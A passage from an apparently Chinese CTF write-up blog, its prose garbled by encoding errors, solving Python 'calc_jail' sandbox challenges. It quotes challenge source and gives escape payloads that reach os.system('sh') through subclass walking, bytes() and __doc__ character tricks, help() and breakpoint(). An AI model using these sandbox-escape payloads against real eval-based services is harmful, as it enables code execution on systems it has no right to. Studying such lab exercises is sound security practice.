input(&quot;&gt; &quot;)</span><br><span class="line">filter(input_data)</span><br><span class="line">if len(input_data)&gt;13:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªé»‘åå•+é•¿åº¦é™åˆ¶ï¼Œä½†æ˜¯ä¹‹å‰åšè¿‡3äº†ï¼Œç”¨help()å›ºç„¶å¯è¡Œï¼Œåªæ˜¯æœ‰ç‚¹ç¼ºå°‘æ–°ä¸œè¥¿</p>
<p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨breakpoint()</p>
<p>breakpointä¹‹åå°±ä¼šè¿›å…¥åˆ°ä¸€ä¸ªå«åšpdbçš„ä¸œè¥¿å½“ä¸­</p>
<p>â€‹	<em>pdb æ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äº Python ç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„ Python ä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚</em></p>
<p>â€‹	è¿›å…¥pdbå½“ä¸­å°±èƒ½rceäº†ï¼Œç”¨ä¹‹å‰çš„payloadå°±èƒ½è¯»åˆ°flag</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531635.png?raw=true" alt="image-20240604200800957"></p>
<h4 id="calc-jail-beginner-level3"><a href="#calc-jail-beginner-level3" class="headerlink" title="calc_jail_beginner_level3"></a>calc_jail_beginner_level3</h4><p>é™„ä»¶æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ ____  </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | |___ \ </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ </span><br><span class="line">              __/ |                          _/ |                                     </span><br><span class="line">             |___/                          |__/                                                                                       </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line">#the length is be limited less than 7</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if len(input_data)&gt;7:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿›ä¸€æ­¥å°†æˆ‘ä»¬çš„payloadé•¿åº¦é™åˆ¶åˆ°äº†7</p>
<p>å®˜æ–¹ç»™å‡ºçš„è§£æ³•æ˜¯help()å‡½æ•°è¿›å…¥äº¤äº’ç•Œé¢ï¼Œæ‰¾åˆ°æ¨¡å—è¾“å…¥!+å‘½ä»¤å°±è¡Œäº†</p>
<p>å®Œæ•´payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help()</span><br><span class="line">os</span><br><span class="line">!ls</span><br><span class="line">!cat flag</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531614.png?raw=true" alt="image-20240604195125612"></p>
<h4 id="calc-jail-beginner-level4"><a href="#calc-jail-beginner-level4" class="headerlink" title="calc_jail_beginner_level4"></a>calc_jail_beginner_level4</h4><p>é¢˜ç›®é™„ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#No danger function,no chr,Try to hack me!!!!</span><br><span class="line">#Try to read file ./flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [&#x27;__loader__&#x27;, &#x27;__import__&#x27;, &#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;chr&#x27;]</span><br><span class="line"></span><br><span class="line">eval_func = eval</span><br><span class="line"></span><br><span class="line">for m in BANLIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line">del __loader__, __builtins__</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ _  _   </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |  </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span><br><span class="line">              __/ |                          _/ |                                      </span><br><span class="line">             |___/                          |__/                                                                                                                                             </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if filter(input_data):</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval_func(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥çœ‹é»‘åå•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BANLIST = [&#x27;__loader__&#x27;, &#x27;__import__&#x27;, &#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;chr&#x27;]</span><br></pre></td></tr></table></figure>

<p>è¿™äº›éƒ½æ¯”è¾ƒå¸¸è§„ï¼Œèƒ½ç»•ä¸€ä¸‹ï¼Œä½†æ˜¯chrä¹Ÿbanäº†ï¼Œè¿™æ„å‘³ç€æ²¡åŠæ³•ç”¨chrå‡½æ•°å’ŒASCIIç»•è¿‡äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br></pre></td></tr></table></figure>

<p>å•åŒå¼•å·æ–œæ éƒ½è¢«ban</p>
<p>ä¸è¿‡ä¹‹å‰level1çš„é‚£ä¸ªæ€è·¯è¿˜æ˜¯èƒ½å¾—è¡Œçš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">//è·å–å½“å‰ç±»â€”â€”&gt;è·å–å½“å‰ç±»çš„åŸºç±»â€”â€”&gt;è¿”å›å½“å‰ç±»çš„æ‰€æœ‰å­ç±»</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531141.png?raw=true" alt="image-20240605153904137"></p>
<p>çœ‹åˆ°äº†è€ç†Ÿäººï¼Œå€’æ•°ç¬¬å››ä¸ªè¿™ä¸ª&lt;class â€˜os._wrap_closeâ€™&gt;</p>
<p>ä¹‹å‰æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯åå°„å‡ºå»ç„¶åç”¨å…¨å±€å˜é‡æ‹¿shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶åœ¨è¿™é‡Œæˆ‘ä»¬çš„å•å¼•å·åŒå¼•å·éƒ½è¢«banäº†ï¼Œéœ€è¦æˆ‘ä»¬è¿›è¡Œä¸€ä¸‹ç»•è¿‡</p>
<p>ç»•è¿‡çš„æ€è·¯æœ‰ä¸¤ä¸ª</p>
<p><strong>åˆ©ç”¨bytes</strong></p>
<p>â€‹	bytes()å‡½æ•°èƒ½å°†æ•°å­—å¯¹åº”çš„ASCIIç è¿›è¡Œè½¬æ¢ï¼Œåˆ©ç”¨è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æŠŠsystemå’Œshè¿™éƒ¨åˆ†ç»™è¡¨ç¤ºå‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\æ—éƒ‘æœ\AppData\Roaming\Typora\typora-user-images\image-20240605155032859.png" alt="image-20240605155032859"></p>
<p><strong>åˆ©ç”¨docé­”æœ¯æ–¹æ³•</strong></p>
<p>docæ˜¯ç±»çš„å¸®åŠ©æ–‡æ¡£ï¼Œä¸€èˆ¬åŒ…å«äº†ç±»çš„ä¸€äº›è¯´æ˜</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªdocé­”æœ¯æ–¹æ³•ï¼Œæ ¹æ®å¯¹åº”çš„ç´¢å¼•æ‹¼å‡ºæ¥æˆ‘ä»¬çš„payload</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532595.png?raw=true" alt="image-20240605155746750"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Answer: Built-in immutable sequence.</span><br><span class="line"></span><br><span class="line">If no argument is given, the constructor returns an empty tuple.</span><br><span class="line">If iterable is specified the tuple is initialized from iterable&#x27;s items.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__doc__[19]å°±è¡¨ç¤ºäº†å­—æ¯s</span><br><span class="line">åˆ©ç”¨è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è¿›è¡ŒRCE</span><br></pre></td></tr></table></figure>

<p>Payloadå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ç§ç›´æ¥è¯»flagçš„ï¼Œå¦‚æœçŸ¥é“æ–‡ä»¶åå°±å¯ä»¥è¯•è¯•çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;flag&#x27;).read()//ä¸èƒ½ç›´æ¥ç”¨ï¼Œè¦ç”¨ä¸Šé¢çš„æ–¹æ³•ç¼–ç æ‰è¡Œ</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532012.png?raw=true" alt="image-20240605160232255"></p>
<h4 id="calc-jail-beginner-level4-0-5"><a href="#calc-jail-beginner-level4-0-5" class="headerlink" title="calc_jail_beginner_level4.0.5"></a>calc_jail_beginner_level4.0.5</h4><p>è¿™ä¸€é¢˜ä¸ç»™é™„ä»¶æºç </p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532925.png?raw=true" alt="image-20240605160532664"></p>
<p>è¿™ç§æƒ…å†µï¼Œç”¨å‡ ä¸ªä»¥å‰çš„payloadæ¢æ¢å°±è€å®äº†</p>
<p>ç”¨level4çš„payloadï¼Œä¹Ÿå°±æ˜¯bytesçš„ASCII listç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532244.png?raw=true" alt="image-20240605160715925"></p>
<p>é©¬ä¸Šå‡ºäº†ï¼Œä½†æ˜¯å‡ºäºå­¦ä¹ çš„ç›®çš„ï¼Œå’±éƒ½æ‹¿åˆ°shelläº†ï¼Œæ‹–ä¸ªæºç çœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#No danger function,no chr,Try to hack me!!!!</span><br><span class="line">#Try to read file ./flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [&#x27;__loader__&#x27;, &#x27;__import__&#x27;, &#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;chr&#x27;, &#x27;input&#x27;,&#x27;locals&#x27;,&#x27;globals&#x27;]</span><br><span class="line"></span><br><span class="line">my_eval_func_0002321 = eval</span><br><span class="line">my_input_func_2309121 = input</span><br><span class="line"></span><br><span class="line">for m in BANLIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line">del __loader__, __builtins__</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ _  _    ___   _____ </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__  </span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \ </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/ </span><br><span class="line">              __/ |                          _/ |                                                   </span><br><span class="line">             |___/                          |__/                                                                                                                                                      </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">print(&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,\&quot;,&#x27; Good luck!&quot;)</span><br><span class="line">input_data = my_input_func_2309121(&quot;&gt; &quot;)</span><br><span class="line">if filter(input_data):</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(my_eval_func_0002321(input_data)))</span><br></pre></td></tr></table></figure>

<p>â€‹	å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯å¯¹localå’Œglobalè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸è¿‡æŒ‰è¿™ä¸ªå¾ªåºæ¸è¿›çš„é£æ ¼æ¥çœ‹ï¼Œåº”è¯¥æ˜¯ç”¨level4ç›¸åŒçš„æ€è·¯è¿›è¡Œç»•è¿‡ï¼Œæ‹¿åˆ°globalå’Œlocalï¼Œè¿˜è¡Œ</p>
<h4 id="calc-jail-beginner-level4-1"><a href="#calc-jail-beginner-level4-1" class="headerlink" title="calc_jail_beginner_level4.1"></a>calc_jail_beginner_level4.1</h4><p>è¿™é¢˜ä¹Ÿæ²¡ç»™æºç </p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532885.png?raw=true" alt="image-20240605161513654"></p>
<p>ä½†æ˜¯å¯ä»¥çœ‹åˆ°å¾ˆå¹²è„†ï¼Œç»™äº†banæ‰çš„ä¸œè¥¿</p>
<p>bytesç”¨ä¸äº†äº†ï¼Œä½†æ˜¯ä¹‹å‰é‚£ä¸ªdocè¿˜æ˜¯èƒ½ç”¨çš„</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532003.png?raw=true" alt="image-20240605182621026"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532384.png?raw=true" alt="image-20240605182841509"></p>
<p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ä¹‹å‰byteså»¶ä¼¸å‡ºæ¥çš„è§£æ³•</p>
<p>åˆ©ç”¨Show subclasses with tupleæ‰¾åˆ°<code>bytes</code>ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532289.png?raw=true" alt="image-20240605183049158"></p>
<p>ä¸€é¡¿å¥½æ‰¾ä¹‹åï¼Œå‘ç°bytesç±»åœ¨ç¬¬å…­ä½ï¼Œç”¨ä¹‹å‰çš„ç´¢å¼•çš„æ–¹æ³•è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åŸpayload:</span><br><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</span><br><span class="line"></span><br><span class="line">æœ€ç»ˆpayload:</span><br><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())</span><br><span class="line">//è¿™é‡Œæˆ‘ä»¬ç”¨subclassesçš„ç¬¬å…­ä½ç´¢å¼•è¿›è¡Œäº†bytesçš„æ›¿æ¢</span><br></pre></td></tr></table></figure>



<h4 id="calc-jail-beginer-level4-2"><a href="#calc-jail-beginer-level4-2" class="headerlink" title="calc_jail_beginer_level4.2"></a>calc_jail_beginer_level4.2</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532971.png?raw=true" alt="image-20240605183446140"></p>
<p>å¯ä»¥çœ‹åˆ°è¿åŠ å·éƒ½banäº†ï¼Œè¿™æ ·ä¸€æ¥å°±æ²¡åŠæ³•ç›´æ¥å¥—ç”¨ä¹‹å‰é‚£ä¸ªdocçš„æ–¹æ³•äº†ï¼Œä½†æ˜¯è¿™ä¸ªåŠ å·æ˜¯æœ‰èƒ½æ›¿æ¢çš„</p>
<p>ç”¨joinçš„æ–¹æ³•ï¼Œæ‹¼å‡ºå››ä½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.join([&#x27;4&#x27;, &#x27;3&#x27;, &#x27;9&#x27;, &#x27;6&#x27;])</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„å‰é¢çš„â€™â€™ä¸¤ä¸ªå•å¼•å·éœ€è¦ç»•è¿‡ï¼Œå¯ä»¥ç”¨str()æ¥ä»£æ›¿</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532859.png?raw=true" alt="image-20240605183949779"></p>
<p>è¿˜æœ‰ä¸€ç§å°±æ˜¯ä¸Šä¸€é¢˜çš„bytesè¢«bançš„æƒ…å†µï¼Œè¿™é‡Œåªå¤šbanäº†ä¸ªåŠ å·ï¼Œåº”è¯¥æ˜¯è€ƒå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡çš„ï¼Œæ— ä¼¤å¤§é›…</p>
<h4 id="calc-jail-beginner-level4-3"><a href="#calc-jail-beginner-level4-3" class="headerlink" title="calc_jail_beginner_level4.3"></a>calc_jail_beginner_level4.3</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532797.png?raw=true" alt="image-20240605185315712"></p>
<p>å¤šbanäº†typeå’Œopenï¼Œé™åˆ¶æˆ‘ä»¬æ— æ³•ç›´æ¥openï¼Œä½†æ˜¯ä¹‹å‰çš„ä¸¤ç§payloadè¿˜æ˜¯èƒ½ç”¨çš„ï¼Œæ‰€ä»¥ç›´æ¥æ‰“å°±å¥½äº†</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532853.png?raw=true" alt="image-20240605185453837"></p>
<p>åŒ…å¾—åƒçš„</p>
<h4 id="calc-jail-beginner-level5"><a href="#calc-jail-beginner-level5" class="headerlink" title="calc_jail_beginner_level5"></a>calc_jail_beginner_level5</h4><p>æˆ‘è¶…ï¼Œè¿™ä¸‹å•¥éƒ½ä¸ç»™äº†</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532488.png?raw=true" alt="image-20240605185642215"></p>
<p>å°±ç»™äº†ä¸€ä¸ªdir()çš„æç¤º</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532948.png?raw=true" alt="image-20240605185726018"></p>
<p>ç…§ç€æç¤ºè¾“å…¥dir()ï¼Œæœ‰ä¿©æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªbuiltinsï¼Œè¿™æ˜¯åœ¨æé†’æˆ‘è¿™ä¸ªç©æ„èƒ½è¢«æˆ‘ç”¨å—</p>
<p>å‘ç°eval(input())è¿™ä¸ªæ‰‹æ³•å¹¶æ²¡æœ‰å¤±æ•ˆ</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532631.png?raw=true" alt="image-20240605190140153"></p>
<p>ç›´æ¥æ‹¿shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532814.png?raw=true" alt="image-20240605190359487"></p>
<p>æˆ‘ä¹Ÿæ˜¯å°è¯•ç‰›åˆ€äº†ä¸€å›</p>
<h4 id="calc-jail-beginner-level5-1"><a href="#calc-jail-beginner-level5-1" class="headerlink" title="calc_jail_beginner_level5.1"></a>calc_jail_beginner_level5.1</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532404.png?raw=true" alt="image-20240605190540016"></p>
<p>å’Œlevel5ä¸€æ ·å•Šï¼Œçœ‹çœ‹dir()èƒ½ä¸èƒ½å‡ºä¸€äº›å¥½çš„æç¤º</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532642.png?raw=true" alt="image-20240605190603572"></p>
<p>æ€ä¹ˆå¥½åƒåˆèƒ½ç”¨äº†</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532021.png?raw=true" alt="image-20240605190645950"></p>
<p>æŠŠæˆ‘çš„evalç»™å¹²æ‰äº†ï¼Œè¯•è¯•çœ‹åˆ«çš„æ–¹æ³•å§</p>
<p>å‘ç°help()ä¹Ÿä¸è¡Œå•Šï¼Œçœ‹æ¥æ˜¯banäº†ä¹‹å‰çŸ­payloadé‚£ä¸€è¿ä¸²äº†ï¼Œçœ‹çœ‹doc</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532233.png?raw=true" alt="image-20240605190900992"></p>
<p>å¯ä»¥çœ‹åˆ°docæ˜¯å¾—è¡Œçš„å•Šï¼ŒæŠŠä¹‹å‰çš„payloadæ‹‰ä¸‹æ¥ç”¨</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532194.png?raw=true" alt="image-20240605191000465"></p>
<p>ä½†æ˜¯ç…§æ¬æ˜¯ä¸å¾—è¡Œæ»´ï¼Œçœ‹æ¥éœ€è¦å¦å¤–æ“ä¸€æ“</p>
